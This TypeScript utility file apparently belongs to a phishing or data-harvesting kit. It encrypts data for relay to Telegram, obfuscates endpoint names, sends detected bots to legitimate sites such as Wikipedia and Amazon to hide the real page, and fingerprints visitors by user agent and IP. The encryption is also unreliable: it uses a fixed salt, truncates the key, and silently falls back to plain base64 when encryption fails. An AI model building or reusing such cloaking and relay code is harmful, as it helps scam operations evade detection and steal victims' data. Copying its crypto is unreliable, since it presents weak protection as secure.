// Encryption utilities for securing Telegram communications
import crypto from 'crypto'

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY

// SECURITY FIX: Handle missing encryption key gracefully
// In production, require explicit key. In development, generate temporary key with warning.
let safeEncryptionKey: string

if (!ENCRYPTION_KEY) {
  if (process.env.NODE_ENV === 'production') {
    // In production, hard fail immediately
    throw new Error('CRITICAL: ENCRYPTION_KEY environment variable is required. Set it in .env file.')
  } else {
    // In development, generate temporary key with warning
    safeEncryptionKey = crypto.randomBytes(32).toString('hex').substring(0, 32)
  }
} else {
  safeEncryptionKey = ENCRYPTION_KEY
}

const IV_LENGTH = 16

// Encrypt sensitive data before sending to Telegram (AES-256-CBC)
export function encryptData(text: string): string {
  try {
    // Create initialization vector
    const iv = crypto.randomBytes(IV_LENGTH)
    
    // Create cipher with proper key derivation
    const key = crypto.scryptSync(safeEncryptionKey.substring(0, 32), 'salt', 32)
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv)
    
    // Encrypt
    let encrypted = cipher.update(text, 'utf8', 'hex')
    encrypted += cipher.final('hex')
    
    // Combine IV and encrypted data
    const combined = iv.toString('hex') + ':' + encrypted
    
    // Base64 encode for safe transmission
    return Buffer.from(combined).toString('base64')
  } catch (error) {
    return Buffer.from(text).toString('base64') // Fallback to simple base64
  }
}

// Decrypt data (for backend processing)
export function decryptData(encryptedText: string): string {
  try {
    // Decode from base64
    const combined = Buffer.from(encryptedText, 'base64').toString('utf8')
    
    // Split IV and encrypted data
    const parts = combined.split(':')
    if (parts.length !== 2) throw new Error('Invalid format')
    
    const iv = Buffer.from(parts[0], 'hex')
    const encrypted = parts[1]
    
    // Create decipher
    const key = crypto.scryptSync(safeEncryptionKey.substring(0, 32), 'salt', 32)
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv)
    
    // Decrypt
    let decrypted = decipher.update(encrypted, 'hex', 'utf8')
    decrypted += decipher.final('utf8')
    
    return decrypted
  } catch (error) {
    // Fallback to base64 decoding
    try {
      return Buffer.from(encryptedText, 'base64').toString('utf8')
    } catch {
      return encryptedText
    }
  }
}

// Obfuscate API endpoint names
export function obfuscateEndpoint(endpoint: string): string {
  // Simple obfuscation - in production, use more sophisticated methods
  return Buffer.from(endpoint).toString('base64url').replace(/=/g, '')
}

// Generate safe redirect URLs for bots
const SAFE_SITES = [
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.amazon.com',
  'https://www.ebay.com',
  'https://www.microsoft.com',
  'https://www.google.com',
  'https://www.apple.com',
  'https://www.github.com',
]

export function getRandomSafeSite(): string {
  return SAFE_SITES[Math.floor(Math.random() * SAFE_SITES.length)]
}

// Generate fingerprint for requests (without exposing sensitive data)
export function generateSecureFingerprint(userAgent: string, ip: string): string {
  const data = `${userAgent}:${ip}`
  return crypto.createHash('sha256').update(data).digest('hex').substring(0, 12)
}

